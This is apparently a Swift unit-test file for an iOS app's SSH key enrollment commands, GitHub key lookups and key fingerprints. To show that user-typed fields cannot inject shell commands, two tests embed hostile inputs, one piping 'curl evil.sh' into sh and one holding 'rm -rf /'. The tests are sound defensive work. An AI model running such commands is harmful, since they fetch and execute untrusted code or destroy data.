import XCTest

@testable import RemoteCraft

/// The enrollment command is pasted into a shell on someone else's machine, with sudo
/// behind it. It has to be exactly right, and it has to be impossible for a text field on
/// a phone to turn it into a second command.
final class EnrollmentCommandTests: XCTestCase {
    private let line = "ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGFSO8jsBtB5yb9TBe2PxsPPAusNWecJZrp+E9rth6qVu3/KLxOMEIOUUmcsTynO69LEupudKPWRJLpPgq88xCY= remote-craft@iphone"

    func testKeyCommandQuotesTheWholeLine() {
        XCTAssertEqual(Omarchy.enrollCommand(publicLine: line),
                       "omarchy-setup-security-sshd --key=\"\(line)\"")
    }

    /// A key with no line at all — an imported RSA key — still yields something runnable:
    /// the interactive form of the same script.
    func testMissingKeyFallsBackToTheInteractiveScript() {
        XCTAssertEqual(Omarchy.enrollCommand(publicLine: "   "), "omarchy-setup-security-sshd")
    }

    /// An imported key's comment is a name the user typed. A name with a `"` in it must
    /// not be able to close the quote and append a second command to a line that is
    /// about to be pasted into a root-capable shell on another machine.
    func testKeyCommandCannotBeEscapedByAKeyComment() {
        let hostile = "ssh-ed25519 AAAAC3Nz my\"; curl evil.sh | sh; echo \"key"

        let command = Omarchy.enrollCommand(publicLine: hostile)

        XCTAssertEqual(command,
                       "omarchy-setup-security-sshd --key=\"ssh-ed25519 AAAAC3Nz my; curl evil.sh | sh; echo key\"")
        XCTAssertEqual(command.filter { $0 == "\"" }.count, 2)
    }

    /// A username field that can carry a `;` is a username field that can carry a second
    /// command, and this one is pasted into a root-capable shell.
    func testGitHubUsernameIsFilteredNotQuoted() {
        XCTAssertEqual(Omarchy.githubCommand(username: "octocat; rm -rf /"),
                       "omarchy-setup-security-sshd --gh-keys octocatrm-rf")
        XCTAssertEqual(Omarchy.githubUsername("  Octo-Cat  "), "Octo-Cat")
        XCTAssertNil(Omarchy.githubKeysURL(username: "!!!"))
        XCTAssertEqual(Omarchy.githubKeysURL(username: "octocat")?.absoluteString,
                       "https://github.com/octocat.keys")
    }
}

/// `--gh-keys` fails silently: Omarchy fetches the URL, appends what it finds, and is
/// perfectly happy appending nothing. Telling the three outcomes apart *before* the user
/// walks to the box is the entire reason the check button exists.
final class GitHubKeysTests: XCTestCase {
    func testPublishedKeysAreCounted() {
        let body = "ssh-ed25519 AAAAC3Nz... one\nssh-rsa AAAAB3Nz... two\n"

        XCTAssertEqual(GitHubKeys.read(status: 200, body: body, username: "octocat"),
                       .published(2))
        XCTAssertTrue(GitHubKeys.read(status: 200, body: body, username: "octocat").isUsable)
    }

    func testMissingUserAndEmptyKeyListAreDifferentOutcomes() {
        XCTAssertEqual(GitHubKeys.read(status: 404, body: "Not Found", username: "nobody"),
                       .noSuchUser("nobody"))
        XCTAssertEqual(GitHubKeys.read(status: 200, body: "\n \n", username: "octocat"),
                       .noKeys("octocat"))
        XCTAssertFalse(GitHubKeys.read(status: 200, body: "", username: "octocat").isUsable)
    }

    func testOtherStatusesSayWhatHappened() {
        XCTAssertEqual(GitHubKeys.read(status: 503, body: "", username: "octocat"),
                       .failed("GitHub answered 503"))
    }
}

/// The fingerprint is the only part of a key a person will ever compare by eye, so it has
/// to match what `ssh-keygen -l` prints for the same key, character for character.
final class FingerprintTests: XCTestCase {
    func testFingerprintMatchesSSHKeygen() {
        let line = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKvmFb2yt76bPHoXj+YC8d12XfXR9bx3mQP61RN82vcr vector"

        XCTAssertEqual(OpenSSHWire.fingerprint(ofPublicLine: line),
                       "SHA256:7OUCCteJ+DEL3EH/Mp6wpFZXcoub1BE2++HWHjUbTbU")
    }

    /// An imported RSA key has no public line, and inventing a fingerprint for it would
    /// be worse than admitting there is not one.
    func testUnparseableLineHasNoFingerprint() {
        XCTAssertNil(OpenSSHWire.fingerprint(ofPublicLine: ""))
        XCTAssertNil(OpenSSHWire.fingerprint(ofPublicLine: "ssh-ed25519"))
    }
}
